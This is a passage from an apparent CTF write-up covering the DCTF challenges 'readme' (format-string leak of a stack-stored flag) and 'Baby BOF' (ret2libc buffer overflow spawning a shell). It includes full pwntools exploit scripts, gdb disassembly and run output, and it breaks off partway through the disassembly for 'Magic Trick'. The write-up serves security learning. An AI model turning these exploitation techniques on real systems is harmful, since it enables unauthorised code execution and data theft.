</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000904</span> <span class="err">&lt;+</span><span class="mi">170</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mi">0x0000000000000905</span> <span class="err">&lt;+</span><span class="mi">171</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>We can see it opens the flag.txt file via fopen and read the flag from the file and store it on the stack, then it takes he input via fgets and then print the given input via printf without any format specifier, this proposed the format string vulnerability and with that we can leak the values from the stack, since the flag is also stored on the stack, we can just as well leak it, using the following exploit, we can get flag:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;dctf-chall-readme.westeurope.azurecontainer.io&#34;</span><span class="p">,</span> <span class="mi">7481</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;%8$lx-%9$lx-%10$lx-%11$x&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;hello &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="p">[</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">x</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">output</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;}&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Running</span> <span class="n">the</span> <span class="n">exploit</span><span class="p">:</span><span class="o">-</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">python3</span> <span class="n">readme</span><span class="o">.</span><span class="n">py</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">dctf</span><span class="o">-</span><span class="n">chall</span><span class="o">-</span><span class="n">readme</span><span class="o">.</span><span class="n">westeurope</span><span class="o">.</span><span class="n">azurecontainer</span><span class="o">.</span><span class="n">io</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">7481</span><span class="p">:</span> <span class="n">Done</span>
</span></span><span class="line"><span class="cl"><span class="sa">b</span><span class="s1">&#39;dctf</span><span class="si">{n0w_g0_r3ad_s0me_b00k5}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Closed</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">dctf</span><span class="o">-</span><span class="n">chall</span><span class="o">-</span><span class="n">readme</span><span class="o">.</span><span class="n">westeurope</span><span class="o">.</span><span class="n">azurecontainer</span><span class="o">.</span><span class="n">io</span> <span class="n">port</span> <span class="mi">7481</span>
</span></span></code></pre></div><h3 id="baby-bof" class="relative group">Baby BOF <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#baby-bof" aria-label="Anchor">#</a></span></h3><p>Baby BOF was normal return to libc attack, since the dockerfile is provided with the challenge which showed that the binary is running in the Ubuntu 20.04 container, hinting that the libc here used is LIBC 2.31, checking the vuln function:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">vuln</span> 
</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">vuln</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005b7</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005b8</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005bb</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x10</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005bf</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xde</span><span class="p">]</span>        <span class="c1"># 0x4006a4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004005c6</span> <span class="err">&lt;+</span><span class="mi">15</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x4004a0</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005cb</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x200a6e</span><span class="p">]</span>        <span class="c1"># 0x601040 &lt;stdin@@GLIBC_2.2.5&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004005d2</span> <span class="err">&lt;+</span><span class="mi">27</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0xa</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005d6</span> <span class="err">&lt;+</span><span class="mi">31</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x100</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005db</span> <span class="err">&lt;+</span><span class="mi">36</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005de</span> <span class="err">&lt;+</span><span class="mi">39</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x4004c0</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005e3</span> <span class="err">&lt;+</span><span class="mi">44</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xcb</span><span class="p">]</span>        <span class="c1"># 0x4006b5
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004005ea</span> <span class="err">&lt;+</span><span class="mi">51</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x4004a0</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005ef</span> <span class="err">&lt;+</span><span class="mi">56</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005f0</span> <span class="err">&lt;+</span><span class="mi">57</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mi">0x00000000004005f1</span> <span class="err">&lt;+</span><span class="mi">58</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span></code></pre></div><p>Again, the fgets function call is vulnerable here, we can see that the buffer is of size 0xa while the size acceptable was 0x100 making it vulnerable to buffer overflow.
Now, for the ret2libc part, I would recommend you to start reading here.</p>
<p>The process is exact same, leak the GOT address of the puts and call main again and call system(&quot;/bin/sh&quot;):-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;dctf-chall-baby-bof.westeurope.azurecontainer.io&#34;</span><span class="p">,</span> <span class="mi">7481</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;baby_bof&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">18</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400683</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;alarm&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;alarm&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">18</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040048e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400683</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><p>Running the exploit:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">❯</span> <span class="nf">python3</span> <span class="no">baby_bof.py</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Opening</span> <span class="no">connection</span> <span class="no">to</span> <span class="no">dctf-chall-baby-bof.westeurope.azurecontainer.io</span> <span class="no">on</span> <span class="no">port</span> <span class="mi">7481</span><span class="p">:</span> <span class="no">Done</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">dctf</span><span class="err">/</span><span class="no">baby_bof</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">No</span> <span class="no">canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">No</span> <span class="no">PIE</span> <span class="p">(</span><span class="mi">0x400000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc-2.31.so</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">PIE</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x7f37b1589000</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">plz</span> <span class="no">don</span><span class="err">&#39;</span><span class="no">t</span> <span class="no">rop</span> <span class="no">me</span>
</span></span><span class="line"><span class="cl"><span class="nf">i</span> <span class="no">don</span><span class="err">&#39;</span><span class="no">t</span> <span class="no">think</span> <span class="no">this</span> <span class="no">will</span> <span class="no">work</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">cat</span> <span class="no">flag.txt</span>
</span></span><span class="line"><span class="cl"><span class="nf">dctf</span><span class="err">{</span><span class="no">D0_y0U_H4v3_A_T3mpl4t3_f0R_tH3s3</span><span class="err">}</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> 
</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="no">Interrupted</span>
</span></span></code></pre></div><h3 id="magic-trick" class="relative group">Magic Trick <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#magic-trick" aria-label="Anchor">#</a></span></h3><p>This was kind of a good challenge, well kind of, first check the security mechanisms:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">checksec</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">checksec</span> <span class="no">for</span> <span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">dctf</span><span class="err">/</span><span class="no">magic_trick</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nf">Canary</span>                        <span class="p">:</span> <span class="err">✓</span> 
</span></span><span class="line"><span class="cl"><span class="no">NX</span>                            <span class="p">:</span> <span class="err">✓</span> 
</span></span><span class="line"><span class="cl"><span class="no">PIE</span>                           <span class="p">:</span> <span class="err">✘</span> 
</span></span><span class="line"><span class="cl"><span class="no">Fortify</span>                       <span class="p">:</span> <span class="err">✘</span> 
</span></span><span class="line"><span class="cl"><span class="no">RelRO</span>                         <span class="p">:</span> <span class="err">✘</span> 
</span></span><span class="line"><span class="cl"><span class="no">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>Now, this shows off that that there’s Canary and NX protection while the PIE and RELRO is disabled, this means we can write the _fini_array or any of the Global Offset Table entries. The main function calls the magic function, checking it:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">magic</span> 
</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">magic</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068d</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068e</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400691</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x20</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400695</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0x28</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040069e</span> <span class="err">&lt;+</span><span class="mi">17</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006a2</span> <span class="err">&lt;+</span><span class="mi">21</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">xor</span>    <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006a4</span> <span class="err">&lt;+</span><span class="mi">23</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x15e</span><span class="p">]</span>        <span class="c1"># 0x400809
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004006ab</span> <span class="err">&lt;+</span><span class="mi">30</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400520</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006b0</span> <span class="err">&lt;+</span><span class="mi">35</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006b4</span> <span class="err">&lt;+</span><span class="mi">39</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006b7</span> <span class="err">&lt;+</span><span class="mi">42</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x165</span><span class="p">]</span>        <span class="c1"># 0x400823
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004006be</span> <span class="err">&lt;+</span><span class="mi">49</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006c3</span> <span class="err">&lt;+</span><span class="mi">54</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400560</span> <span class="p">&lt;</span><span class="no">__isoc99_scanf@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006c8</span> <span class="err">&lt;+</span><span class="mi">59</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x159</span><span class="p">]</span>        <span class="c1"># 0x400828
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004006cf</span> <span class="err">&lt;+</span><span class="mi">66</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400520</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006d4</span> <span class="err">&lt;+</span><span class="mi">71</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x18</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006d8</span> <span class="err">&lt;+</span><span class="mi">75</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006db</span> <span class="err">&lt;+</span><span class="mi">78</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x141</span><span class="p">]</span>        <span class="c1"># 0x400823
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004006e2</span> <span class="err">&lt;+</span><span class="mi">85</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006e7</span> <span class="err">&lt;+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400560</span> <span class="p">&lt;</span><span class="no">__isoc99_scanf@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006ec</span> <span class="err">&lt;+</span><span class="mi">95</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x153</span><span class="p">]</span>        <span class="c1"># 0x400846
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004006f3</span> <span class="err">&lt;+</span><span class="mi">102</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400520</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006f8</span> <span class="err">&lt;+</span><span class="mi">107</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x18</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006fc</span> <span class="err">&lt;+</span><span class="mi">111</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x10</span><span class="p">],</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400700</span> <span class="err">&lt;+</span><span class="mi">115</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400704</span> <span class="err">&lt;+</span><span class="mi">119</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x10</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400708</span> <span class="err">&lt;+</span><span class="mi">123</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="p">],</span><span class="no">rdx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040070b</span> <span class="err">&lt;+</span><span class="mi">126</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
